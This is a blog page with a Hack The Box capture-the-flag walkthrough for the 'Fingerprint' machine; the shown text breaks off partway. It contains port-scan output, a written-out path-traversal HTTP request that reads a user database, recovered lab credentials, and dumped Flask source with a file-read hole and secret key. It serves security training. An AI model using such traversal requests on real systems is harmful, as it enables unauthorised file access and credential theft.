<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="introduceOS:	 LinuxDifficulty:	 InsanePoints:	50Release:	04 Dec 2021IP:	10.10.11.127">
<meta property="og:type" content="article">
<meta property="og:title" content="Hack-The-Box-walkthrough[fingerprint]">
<meta property="og:url" content="https://fdlucifer.github.io/2022/02/03/fingerprint/index.html">
<meta property="og:site_name" content="fdvoid0&#39;s blog">
<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	 InsanePoints:	50Release:	04 Dec 2021IP:	10.10.11.127">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2141.jpg">
<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2142.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2143.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2144.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2145.jpg">
<meta property="article:published_time" content="2022-02-03T12:48:34.000Z">
<meta property="article:modified_time" content="2022-05-21T02:20:40.720Z">
<meta property="article:author" content="fdvoid0">
<meta property="article:tag" content="HackTheBox靶机练习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2141.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2022/02/03/fingerprint/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2022/02/03/fingerprint/","path":"2022/02/03/fingerprint/","title":"Hack-The-Box-walkthrough[fingerprint]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hack-The-Box-walkthrough[fingerprint] | fdvoid0's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">fdvoid0's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">46</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">207</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NMAP"><span class="nav-number">2.1.</span> <span class="nav-text">NMAP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Foothold"><span class="nav-number">3.</span> <span class="nav-text">Foothold</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#User-own"><span class="nav-number">4.</span> <span class="nav-text">User own</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Root-own"><span class="nav-number">5.</span> <span class="nav-text">Root own</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">6.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Contact-me"><span class="nav-number">7.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fdvoid0"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">fdvoid0</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">207</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">46</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2022/02/03/fingerprint/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="fdvoid0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fdvoid0's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Hack-The-Box-walkthrough[fingerprint] | fdvoid0's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Hack-The-Box-walkthrough[fingerprint]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-02-03 20:48:34" itemprop="dateCreated datePublished" datetime="2022-02-03T20:48:34+08:00">2022-02-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-05-21 10:20:40" itemprop="dateModified" datetime="2022-05-21T10:20:40+08:00">2022-05-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>4.7k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>17 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h1><p>OS:	 Linux<br>Difficulty:	 Insane<br>Points:	50<br>Release:	04 Dec 2021<br>IP:	10.10.11.127</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2141.jpg"></p>
</li>
<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
</li>
</ul>
<span id="more"></span>

<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/Fingerprint]</span><br><span class="line">└─<span class="comment"># nmap -p- -sV -sC -v --min-rate=10000 10.10.11.127</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 90:65:07:35:be:8d:7b:ee:ff:3a:11:96:06:a9:a1:b9 (RSA)</span><br><span class="line">|   256 4c:5b:74:d9:3c:c0:60:24:e4:95:2f:b0:51:84:03:c5 (ECDSA)</span><br><span class="line">|_  256 82:f5:b0:d9:73:18:01:47:61:f7:f6:26:0a:d5:<span class="built_in">cd</span>:f2 (ED25519)</span><br><span class="line">80/tcp   open  http    Werkzeug httpd 1.0.1 (Python 2.7.17)</span><br><span class="line">|_http-title: mylog - Starting page</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: HEAD OPTIONS GET</span><br><span class="line">8080/tcp open  http    Sun GlassFish Open Source Edition  5.0.1</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: GET HEAD POST PUT DELETE TRACE OPTIONS</span><br><span class="line">|_  Potentially risky methods: PUT DELETE TRACE</span><br><span class="line">|_http-title: secAUTH</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p>We have a couple interesting ports, both HTTP ports seem to be security applications. One for a python program called “mylog” and the other for “secAuth”:</p>
<p>Both sites require logins to use most of their functions. Instead we can start looking into what both of these are doing. As expected, this first server is a python server:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http://fingerprint.htb/</span><br><span class="line"></span><br><span class="line">[200 OK] Country[RESERVED][ZZ], </span><br><span class="line">HTML5, </span><br><span class="line">HTTPServer</span><br><span class="line">[Werkzeug/1.0.1 Python/2.7.17], </span><br><span class="line">IP[10.129.117.121], </span><br><span class="line">Python[2.7.17], </span><br><span class="line">Script, </span><br><span class="line">Title</span><br><span class="line">[mylog - Starting page], </span><br><span class="line">Werkzeug[1.0.1], </span><br><span class="line">X-UA-Compatible[IE=edge]</span><br></pre></td></tr></table></figure>

<p>The second is unusual, it’s a glassfish server which I’ve never seen before:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">http://fingerprint.htb:8080/</span><br><span class="line"></span><br><span class="line">[200 OK] Country[RESERVED][ZZ],</span><br><span class="line">HTML5, </span><br><span class="line">HTTPServer</span><br><span class="line">[GlassFish Server Open Source Edition  5.0.1], </span><br><span class="line">IP[10.129.117.121], </span><br><span class="line">Java[2.3][Servlet/3.1], </span><br><span class="line">Script, </span><br><span class="line">Sun-GlassFish</span><br><span class="line">[5.0.1][Open Source Edition], </span><br><span class="line">Title</span><br><span class="line">[secAUTH], </span><br><span class="line">X-Powered-By[Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition  5.0.1  Java/Private Build/1.8)], </span><br><span class="line">X-UA-Compatible[IE=edge]</span><br></pre></td></tr></table></figure>

<p>We only really have &#x2F;login and &#x2F;admin on the first site, the second site has a few more directories to work with:</p>
<p>We can start fuzzing general exploits and eventually find LFI in &#x2F;admin&#x2F;view which let’s view files. There’s some interesting usernames that could lead us to a potential foothold, such as flask. If we look into his home directory, we see the web-app’s source code. We can request the database that contains the user information and see if we can get a login:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /admin/view/../../../../../../../../../../../../../../../../home/flask/app/users.db HTTP/1.1</span><br><span class="line">Host: fingerprint.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p>This seems to contain a password:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:u_will_never_guess_this_password</span><br></pre></td></tr></table></figure>

<p>We can grab app.py and see we have access to the config password:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, redirect, request, render_template, session, g, url_for, send_file, make_response</span><br><span class="line">from .auth import check</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">from os import listdir</span><br><span class="line">from os.path import isfile, <span class="built_in">join</span></span><br><span class="line">import io</span><br><span class="line"></span><br><span class="line">LOG_PATH = <span class="string">&quot;/data/logs/&quot;</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;SjG$g5VZ(vHC;M2Xc/2~z(&#x27;</span></span><br><span class="line"></span><br><span class="line">@app.before_request</span><br><span class="line">def load_user():</span><br><span class="line">uid = session.get(<span class="string">&quot;user_id&quot;</span>)</span><br><span class="line">g.uid = uid</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">def main():</span><br><span class="line"><span class="built_in">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>])</span><br><span class="line">def login():</span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">user = do_auth()</span><br><span class="line"><span class="keyword">if</span> user:</span><br><span class="line">session[<span class="string">&quot;user_id&quot;</span>] = user[1]</span><br><span class="line"><span class="built_in">return</span> redirect(url_for(<span class="string">&quot;admin&quot;</span>), code=200)</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> show_login()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def filter_logs(ip, logs):</span><br><span class="line"><span class="keyword">if</span> ip.startswith(<span class="string">&#x27;127.0.&#x27;</span>):</span><br><span class="line"><span class="built_in">return</span> <span class="string">&#x27;\n&#x27;</span>.<span class="built_in">join</span>(logs)</span><br><span class="line"><span class="built_in">return</span> <span class="string">&#x27;\n&#x27;</span>.<span class="built_in">join</span>(filtered_logs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&quot;/admin&quot;</span>)</span><br><span class="line">def admin():</span><br><span class="line"><span class="comment">#log_files = [(f, os.path.getsize(join(LOG_PATH, f))) for f in listdir(LOG_PATH) if isfile(join(LOG_PATH, f))]</span></span><br><span class="line">log_names = [f <span class="keyword">for</span> f <span class="keyword">in</span> listdir(LOG_PATH) <span class="keyword">if</span> isfile(<span class="built_in">join</span>(LOG_PATH, f))]</span><br><span class="line">log_files = []</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> log_names:</span><br><span class="line">f = open(<span class="built_in">join</span>(LOG_PATH, name), <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = f.readlines()</span><br><span class="line">f.close()</span><br><span class="line">log_files.append((name, len(filter_logs(request.remote_addr, data))))</span><br><span class="line"></span><br><span class="line">site_content=render_template(<span class="string">&#x27;admin.html&#x27;</span>, log_files=log_files)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> g.uid is None or not g.uid:</span><br><span class="line">resp = make_response(site_content, 302)</span><br><span class="line">resp.headers[<span class="string">&#x27;Location&#x27;</span>] = <span class="string">&#x27;/login&#x27;</span></span><br><span class="line"><span class="built_in">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> site_content</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&quot;/admin/view/&lt;path:log_path&gt;&quot;</span>)</span><br><span class="line">def logs_view(log_path):</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">path = LOG_PATH + log_path</span><br><span class="line">with open(path, <span class="string">&#x27;r&#x27;</span>) as file:</span><br><span class="line">data = file.readlines()</span><br><span class="line"><span class="built_in">return</span> filter_logs(request.remote_addr, data)</span><br><span class="line">except Exception as e:</span><br><span class="line"><span class="built_in">return</span> <span class="string">&quot;No such log found!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> None</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&quot;/admin/delete/&lt;path:log_path&gt;&quot;</span>)</span><br><span class="line">def logs_delete(log_path):</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">path = LOG_PATH + log_path</span><br><span class="line">os.remove(path)</span><br><span class="line"><span class="built_in">return</span> redirect(url_for(<span class="string">&quot;admin&quot;</span>))</span><br><span class="line">except Exception as e:</span><br><span class="line"><span class="built_in">return</span> <span class="string">&quot;No such log found!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> data</span><br><span class="line"></span><br><span class="line">def do_auth():</span><br><span class="line">user = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> check(user, password)</span><br><span class="line"></span><br><span class="line">def show_login():</span><br><span class="line"><span class="built_in">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SjG<span class="variable">$g5VZ</span>(vHC;M2Xc/2~z(</span><br></pre></td></tr></table></figure>

<p>We also have the source code used to check authentication:</p>
